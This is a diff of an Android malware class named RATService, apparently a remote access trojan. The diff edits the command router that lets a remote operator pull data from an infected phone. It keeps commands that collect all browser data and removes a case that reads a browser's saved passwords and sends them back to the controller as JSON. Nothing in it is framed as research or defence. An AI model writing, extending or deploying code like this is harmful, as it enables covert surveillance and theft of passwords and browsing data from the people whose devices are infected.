@@ -751,8 +751,11 @@ public class RATService extends Service {
 
                 // In routeCommand() method, add these cases:
 
+
+
+// In routeCommand method, replace the browser-related cases with this consolidated version:
+
 case "browser_data":
-case "browser_history":
 case "get_browsers":
     if (browserModule != null) {
         Log.d(TAG, "🌐 Getting all browser data");
@@ -802,25 +805,6 @@ case "browser_bookmarks":
         sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"Invalid package name\"}");
     }
     break;
-
-case "browser_passwords":
-    if (browserModule != null && !args.isEmpty()) {
-        Log.d(TAG, "🌐 Getting passwords for: " + args);
-        JSONArray passwords = browserModule.getSavedPasswords(args);
-        JSONObject result = new JSONObject();
-        result.put("success", true);
-        result.put("packageName", args);
-        result.put("passwords", passwords);
-        result.put("count", passwords.length());
-        sendCommand("BROWSER_PASSWORDS|" + result.toString());
-    } else {
-        sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"Invalid package name\"}");
-    }
-    break;
-
-
-
-
 
 
                 
